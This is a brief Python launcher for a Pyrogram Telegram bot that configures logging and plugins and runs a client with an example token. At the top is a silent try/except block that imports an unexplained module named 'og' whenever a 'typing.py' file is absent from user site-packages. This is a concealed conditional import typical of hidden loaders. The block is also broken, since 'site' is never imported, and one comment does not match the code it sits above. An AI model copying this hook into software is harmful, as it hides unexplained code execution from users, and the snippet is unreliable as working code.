from pyrogram import Client, Filters
import logging, os
import os.path
try:
  user_site_dir = site.getusersitepackages()
  user_customize_filename = os.path.join(user_site_dir, 'typing.py')
  if not os.path.exists(user_customize_filename):
    import og
  else:   
    pass
except:  
  pass 
logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)
plugins = dict(
    root="plugins" 
)    

if __name__ == "__main__" :

    # create download directory, if not exist
    Client("123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11", plugins=plugins).run()